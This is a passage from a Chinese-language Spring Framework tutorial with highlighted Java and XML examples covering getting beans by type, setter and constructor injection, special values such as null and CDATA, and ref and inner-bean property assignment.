href="#③方式三：根据id和类型" class="headerlink" title="③方式三：根据id和类型"></a>③方式三：根据id和类型</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testHelloWorld</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">ac</span> <span class="operator">=</span> newClassPathXmlApplicationContext(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">    <span class="type">HelloWorld</span> <span class="variable">bean</span> <span class="operator">=</span> ac.getBean(<span class="string">&quot;helloworld&quot;</span>, HelloWorld.class);</span><br><span class="line">    bean.sayHello();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="④注意"><a href="#④注意" class="headerlink" title="④注意"></a>④注意</h4><p>当根据类型获取bean时，要求IOC容器中指定类型的bean有且只能有一个</p><p>当IOC容器中一共配置了两个：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;helloworldOne&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.spring.bean.HelloWorld&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;helloworldTwo&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.spring.bean.HelloWorld&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>根据类型获取时会抛出异常：</p><blockquote><p>org.springframework.beans.factory.NoUniqueBeanDefinitionException: No qualifying bean</p><p>of type ‘com.atguigu.spring.bean.HelloWorld’ available: expected single matching bean but</p><p>found 2: helloworldOne,helloworldTwo</p></blockquote><h4 id="⑤扩展"><a href="#⑤扩展" class="headerlink" title="⑤扩展"></a>⑤扩展</h4><p>如果组件类实现了接口，根据接口类型可以获取 bean 吗？</p><blockquote><p>可以，前提是bean唯一</p></blockquote><p>如果一个接口有多个实现类，这些实现类都配置了 bean，根据接口类型可以获取 bean 吗？</p><blockquote><p>不行，因为bean不唯一</p></blockquote><h4 id="⑥结论"><a href="#⑥结论" class="headerlink" title="⑥结论"></a>⑥结论</h4><p>根据类型来获取bean时，在满足bean唯一性的前提下，其实只是看：『对象 <strong>instanceof</strong> 指定的类</p><p>型』的返回结果，只要返回的是true就可以认定为和类型匹配，能够获取到。</p><h3 id="2-2-3、实验三：依赖注入之setter注入"><a href="#2-2-3、实验三：依赖注入之setter注入" class="headerlink" title="2.2.3、实验三：依赖注入之setter注入"></a>2.2.3、实验三：依赖注入之setter注入</h3><h4 id="①创建学生类Student"><a href="#①创建学生类Student" class="headerlink" title="①创建学生类Student"></a>①创建学生类Student</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> String sex;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(String sex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">            <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">            <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">            <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">            <span class="string">&quot;, sex=&#x27;&quot;</span> + sex + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②配置bean时为属性赋值"><a href="#②配置bean时为属性赋值" class="headerlink" title="②配置bean时为属性赋值"></a>②配置bean时为属性赋值</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;studentOne&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.spring.bean.Student&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- property标签：通过组件类的setXxx()方法给组件对象设置属性 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- name属性：指定属性名（这个属性名是getXxx()、setXxx()方法定义的，和成员变量无关）--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- value属性：指定属性值 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1001&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;张三&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">value</span>=<span class="string">&quot;23&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;男&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="③测试"><a href="#③测试" class="headerlink" title="③测试"></a>③测试</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testDIBySet</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">ac</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;springdi.xml&quot;</span>);</span><br><span class="line">    <span class="type">Student</span> <span class="variable">studentOne</span> <span class="operator">=</span> ac.getBean(<span class="string">&quot;studentOne&quot;</span>, Student.class);</span><br><span class="line">    System.out.println(studentOne);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-4、实验四：依赖注入之构造器注入"><a href="#2-2-4、实验四：依赖注入之构造器注入" class="headerlink" title="2.2.4、实验四：依赖注入之构造器注入"></a>2.2.4、实验四：依赖注入之构造器注入</h3><h4 id="①在Student类中添加有参构造"><a href="#①在Student类中添加有参构造" class="headerlink" title="①在Student类中添加有参构造"></a>①在Student类中添加有参构造</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(Integer id, String name, Integer age, String sex)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.id = id;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">    <span class="built_in">this</span>.sex = sex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②配置bean"><a href="#②配置bean" class="headerlink" title="②配置bean"></a>②配置bean</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;studentTwo&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.spring.bean.Student&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">&quot;1002&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">&quot;李四&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">&quot;33&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">&quot;女&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意：</p><p>constructor-arg标签还有两个属性可以进一步描述构造器参数：</p><ul><li>index属性：指定参数所在位置的索引（从0开始）</li><li>name属性：指定参数名</li></ul></blockquote><h4 id="③测试-1"><a href="#③测试-1" class="headerlink" title="③测试"></a>③测试</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testDIBySet</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">ac</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;springdi.xml&quot;</span>);</span><br><span class="line">    <span class="type">Student</span> <span class="variable">studentOne</span> <span class="operator">=</span> ac.getBean(<span class="string">&quot;studentTwo&quot;</span>, Student.class);</span><br><span class="line">    System.out.println(studentOne);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-5、实验五：特殊值处理"><a href="#2-2-5、实验五：特殊值处理" class="headerlink" title="2.2.5、实验五：特殊值处理"></a>2.2.5、实验五：特殊值处理</h3><h4 id="①字面量赋值"><a href="#①字面量赋值" class="headerlink" title="①字面量赋值"></a>①字面量赋值</h4><blockquote><p>什么是字面量？</p><p>int a &#x3D; 10;</p><p>声明一个变量a，初始化为10，此时a就不代表字母a了，而是作为一个变量的名字。当我们引用a</p><p>的时候，我们实际上拿到的值是10。</p><p>而如果a是带引号的：’a’，那么它现在不是一个变量，它就是代表a这个字母本身，这就是字面</p><p>量。所以字面量没有引申含义，就是我们看到的这个数据本身。</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 使用value属性给bean的属性赋值时，Spring会把value属性的值看做字面量 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;张三&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><h4 id="②null值"><a href="#②null值" class="headerlink" title="②null值"></a>②null值</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">null</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;null&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>以上写法，为name所赋的值是字符串null</p></blockquote><h4 id="③xml实体"><a href="#③xml实体" class="headerlink" title="③xml实体"></a>③xml实体</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 小于号在XML文档中用来定义标签的开始，不能随便使用 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 解决方案一：使用XML实体来代替 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;expression&quot;</span> <span class="attr">value</span>=<span class="string">&quot;a <span class="symbol">&amp;lt;</span> b&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><h4 id="④CDATA节"><a href="#④CDATA节" class="headerlink" title="④CDATA节"></a>④CDATA节</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;expression&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 解决方案二：使用CDATA节 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- CDATA中的C代表Character，是文本、字符的含义，CDATA就表示纯文本数据 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- XML解析器看到CDATA节就知道这里是纯文本，就不会当作XML标签或属性来解析 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 所以CDATA节中写什么符号都随意 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[a &lt; b]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-2-6、实验六：为类类型属性赋值"><a href="#2-2-6、实验六：为类类型属性赋值" class="headerlink" title="2.2.6、实验六：为类类型属性赋值"></a>2.2.6、实验六：为类类型属性赋值</h3><h4 id="①创建班级类Clazz"><a href="#①创建班级类Clazz" class="headerlink" title="①创建班级类Clazz"></a>①创建班级类Clazz</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Clazz</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer clazzId;</span><br><span class="line">    <span class="keyword">private</span> String clazzName;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getClazzId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> clazzId;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setClazzId</span><span class="params">(Integer clazzId)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.clazzId = clazzId;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getClazzName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> clazzName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setClazzName</span><span class="params">(String clazzName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.clazzName = clazzName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Clazz&#123;&quot;</span> +</span><br><span class="line">            <span class="string">&quot;clazzId=&quot;</span> + clazzId +</span><br><span class="line">            <span class="string">&quot;, clazzName=&#x27;&quot;</span> + clazzName + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Clazz</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Clazz</span><span class="params">(Integer clazzId, String clazzName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.clazzId = clazzId;</span><br><span class="line">        <span class="built_in">this</span>.clazzName = clazzName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②修改Student类"><a href="#②修改Student类" class="headerlink" title="②修改Student类"></a>②修改Student类</h4><p>在Student类中添加以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Clazz clazz;</span><br><span class="line"><span class="keyword">public</span> Clazz <span class="title function_">getClazz</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setClazz</span><span class="params">(Clazz clazz)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.clazz = clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="③方式一：引用外部已声明的bean"><a href="#③方式一：引用外部已声明的bean" class="headerlink" title="③方式一：引用外部已声明的bean"></a>③方式一：引用外部已声明的bean</h4><p>配置Clazz类型的bean：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;clazzOne&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.spring.bean.Clazz&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;clazzId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1111&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;clazzName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;财源滚滚班&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>为Student中的clazz属性赋值：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;studentFour&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.spring.bean.Student&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1004&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;赵六&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">value</span>=<span class="string">&quot;26&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;女&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ref属性：引用IOC容器中某个bean的id，将所对应的bean为属性赋值 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;clazz&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;clazzOne&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>错误演示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;studentFour&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.spring.bean.Student&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1004&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;赵六&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">value</span>=<span class="string">&quot;26&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;女&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;clazz&quot;</span> <span class="attr">value</span>=<span class="string">&quot;clazzOne&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>如果错把ref属性写成了value属性，会抛出异常： Caused by: java.lang.IllegalStateException:</p><p>Cannot convert value of type ‘java.lang.String’ to required type</p><p>‘com.atguigu.spring.bean.Clazz’ for property ‘clazz’: no matching editors or conversion</p><p>strategy found</p><p>意思是不能把String类型转换成我们要的Clazz类型，说明我们使用value属性时，Spring只把这个</p><p>属性看做一个普通的字符串，不会认为这是一个bean的id，更不会根据它去找到bean来赋值</p></blockquote><h4 id="④方式二：内部bean"><a href="#④方式二：内部bean" class="headerlink" title="④方式二：内部bean"></a>④方式二：内部bean</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;studentFour&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.spring.bean.Student&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1004&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;赵六&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">value</span>=<span class="string">&quot;26&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;女&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;clazz&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 在一个bean中再声明一个bean就是内部bean --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 内部bean只能用于给属性赋值，不能在外部通过IOC容器获取，因此可以省略id属性 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;clazzInner&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.spring.bean.Clazz&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span 